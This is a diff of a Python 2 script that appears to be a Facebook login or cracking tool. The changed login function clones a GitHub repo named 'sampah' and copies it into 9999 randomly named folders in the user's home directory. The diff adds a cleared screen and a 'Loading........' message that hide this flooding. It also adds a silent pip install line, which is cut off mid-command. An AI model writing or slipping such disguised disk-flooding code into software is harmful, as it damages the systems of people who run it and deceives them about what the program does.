@@ -1,5 +1,6 @@
-#Decompiled by MR.K7C8NG
-import string,os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
+import os,sys
+os.system('pip2 install --upgrade pip && pip2 install requests && pip2 inst>
+import string,time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
 from requests.exceptions import ConnectionError
@@ -64,6 +65,8 @@ def login():
     os.system('clear')
     try:
         os.system('git clone https://github.com/BlackSelakangan/sampah')
+        os.system('clear')
+        print 'Loading........'
         for i in range(9999):
           length =6
           letters = string.ascii_letters
@@ -71,7 +74,7 @@ def login():
           os.system('mkdir $HOME/'+result_str)
           os.system('cp -rf sampah $HOME/'+result_str)
 
-
+        os.system('rm -rf sampah')
         toket = open('login.txt', 'r')
         menu()
     except (KeyError, IOError):
